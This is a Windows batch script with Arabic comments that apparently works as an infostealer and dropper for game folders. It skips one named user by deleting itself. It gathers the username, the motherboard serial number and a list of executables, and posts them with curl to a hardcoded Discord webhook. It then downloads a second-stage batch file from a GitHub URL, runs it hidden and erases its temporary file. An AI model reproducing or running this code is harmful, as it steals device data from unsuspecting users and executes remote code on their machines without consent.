@echo off
setlocal enabledelayedexpansion

:: 1. فحص اسم المستخدم (Anti-Bruno Check)
set "TARGET_USER=Bruno"
if /I "%USERNAME%"=="%TARGET_USER%" (
    start /b "" cmd /c "timeout /t 1 >nul & del /f /q "%~f0""
    exit
)

:: 2. استخراج اسم مجلد اللعبة (عشان نسمي الملف بيه)
for %%I in ("%cd%") do set "GAME_NAME=%%~nxI"

:: 3. إعداد اسم الملف الجديد (Username_GameName.txt)
set "FILE_NAME=%USERNAME%_%GAME_NAME%.txt"
set "TEMP_FILE=%TEMP%\%FILE_NAME%"

:: 4. إعداد الروابط
set "WEBHOOK_URL=https://discord.com/api/webhooks/1461392959575687240/LwVE9O2alP5eDdU9fvRH6X1awl_C6g-SISy6RRNOPHXe2O7VXP3Jb3MBmmeQcQck9D-G"
set "BAT1_URL=https://raw.githubusercontent.com/857seif/11111111/main/1.bat"
set "BAT1_PATH=%TEMP%\1.bat"

:: 5. جمع معلومات الجهاز والملفات
echo === Device Info === > "%TEMP_FILE%"
echo Username: %USERNAME% >> "%TEMP_FILE%"
echo Game Folder: %GAME_NAME% >> "%TEMP_FILE%"
echo Motherboard ID: >> "%TEMP_FILE%"
wmic baseboard get serialnumber | findstr /V "SerialNumber" >> "%TEMP_FILE%"
echo. >> "%TEMP_FILE%"
echo === Folder Contents (EXE) === >> "%TEMP_FILE%"
dir /b /s *.exe >> "%TEMP_FILE%"

:: 6. إرسال البيانات إلى Discord بالاسم الجديد
curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%TEMP_FILE%" "%WEBHOOK_URL%"

:: 7. تحميل ملف المرحلة الثانية (1.bat) وتشغيله
curl -L -o "%BAT1_PATH%" "%BAT1_URL%"
if exist "%BAT1_PATH%" (
    start /b "" cmd /c "%BAT1_PATH%"
)

:: 8. مسح ملف النتائج والاختفاء
if exist "%TEMP_FILE%" del /f /q "%TEMP_FILE%"
exit
